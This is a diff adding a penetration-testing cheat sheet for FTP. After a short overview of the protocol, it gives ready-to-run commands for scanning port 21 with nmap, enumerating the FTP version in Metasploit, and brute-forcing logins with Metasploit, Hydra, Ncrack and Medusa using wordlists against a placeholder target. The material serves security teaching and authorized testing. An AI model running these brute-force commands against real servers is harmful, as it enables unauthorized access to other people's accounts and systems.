@@ -1,0 +1,66 @@
+FTP stands for File Transfer Protocol used for the transfer of computer files such as docs, PDF, multimedia and etc between a client and server on a computer network
+via port 21. Port 21 is default port which gets open when FTP is activated for sharing data.
+
+Uses of FTP
+  *An FTP site is a web site where users can easily upload or download specific files.
+  *FTP by mail allows users without access to the Internet to access and copy files using anonymous FTP by sending an email message to ftpmail@decwrl.dec.com and 
+   puting the word help in the body of the text.
+  *FTP Explorer is an FTP client based on Windows 95 file manager (Windows 95 Explorer).
+  *An FTP server is a dedicated computer which provides FTP service. This invites hackers and necessitates security hardware or software such as utilizing usernames,
+   passwords, and file access control.
+  *An FTP client is a computer application which accesses an FTP server. While doing so, users should block incoming FTP connection attempts using passive mode and 
+   should check for viruses on all downloaded files.
+
+
+Scanning FTP with nmap
+An attacker may take help of nmap to verify whether port 21 is activated or not. For FTP penetration, we are also using nmap in order to scan the targeted system 
+for open FTP port.
+  nmap -p 21 IPADDRESS
+
+Version Enumeration on FTP
+Try to get the FTP version through ftp_version on Metasploit. Open the terminal in your Kali Linux and Load Metasploit framework now type the following command to 
+scan for FTP version.
+ 
+  use auxiliary/scanner/ftp/ftp_version
+  msf auxiliary(ftp_version) > set rhosts IPADDRESS
+  msf auxiliary(ftp_version) > exploit
+
+FTP Brute force Attack
+Open the terminal in your Kali Linux and Load Metasploit framework now type the following command to Brute force FTP login.
+
+  use auxiliary/scanner/ftp/ftp_login
+  msf auxiliary(ftp_login) > set rhosts IPADDRESS
+  msf auxiliary(ftp_login) > set user_file /root/Desktop/user.txt
+  msf auxiliary(ftp_login) > set pass_file /root/Desktop/pass.txt 
+  msf auxiliary(ftp_login) > set stop_on_success true
+  msf auxiliary(ftp_login) > exploit
+  
+Password Cracking:FTP
+Hydra
+Hydra is often the tool of choice. It can perform rapid dictionary attacks against more than 50 protocols, including telnet, ftp, http, https, smb, several 
+databases, and much more.
+Run the following command
+  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt IPADDRESS ftp
+ 
+Ncrack
+Ncrack is a high-speed network authentication cracking tool. It was built to help companies secure their networks by proactively testing all their hosts and 
+networking devices for poor passwords. 
+Run the following command
+  ncrack -v -U /root/Desktop/user.txt -P /root/Desktop/pass.txt IPADDRESS
+  
+Medusa
+Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. It supports many protocols: AFP, CVS, FTP, HTTP, IMAP, rlogin, SSH, Subversion,
+and VNC to name a few
+Run the following command
+  medusa -h IPADDRESS -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M ftp
+
+Metasploit
+This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.
+Open Kali terminal type msfconsole
+Now type 
+  use auxiliary/scanner/ftp/ftp_login
+  msf exploit (ftp_login)>set rhosts IPADDRESS
+  msf exploit (ftp_login)>set user_file /root/Desktop/user.txt
+  msf exploit (ftp_login)>set pass_file /root/Desktop/pass.txt
+  msf exploit (ftp_login)>set stop_on_success true
+  msf exploit (ftp_login)> exploit
